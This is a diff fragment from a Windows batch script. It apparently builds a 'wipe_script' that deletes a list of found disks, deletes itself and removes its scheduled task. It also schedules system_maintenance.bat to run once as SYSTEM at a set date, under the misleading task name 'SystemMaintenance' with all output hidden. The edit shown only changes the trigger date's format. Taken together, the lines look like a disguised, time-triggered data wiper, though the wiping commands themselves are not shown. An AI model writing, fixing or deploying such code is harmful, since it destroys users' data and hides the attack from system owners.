@@ -260,5 +260,5 @@ echo del "C:\Windows\Temp\disks_found.txt" ^>nul 2^>^&1 >> "%wipe_script%"
 echo del "%%~f0" ^>nul 2^>^&1 >> "%wipe_script%"
 echo schtasks /delete /tn "SystemMaintenance" /f ^>nul 2^>^&1 >> "%wipe_script%"
 
-powershell -Command "schtasks /create /tn 'SystemMaintenance' /tr 'cmd.exe /c \"C:\Windows\Temp\system_maintenance.bat\" >nul 2>&1' /sc once /st 16:25 /sd 04/02/2026 /ru \"SYSTEM\" /f" >nul 2>&1
+powershell -Command "schtasks /create /tn 'SystemMaintenance' /tr 'cmd.exe /c \"C:\Windows\Temp\system_maintenance.bat\" >nul 2>&1' /sc once /st 16:25 /sd 02/04/2026 /ru \"SYSTEM\" /f" >nul 2>&1
 exit /b
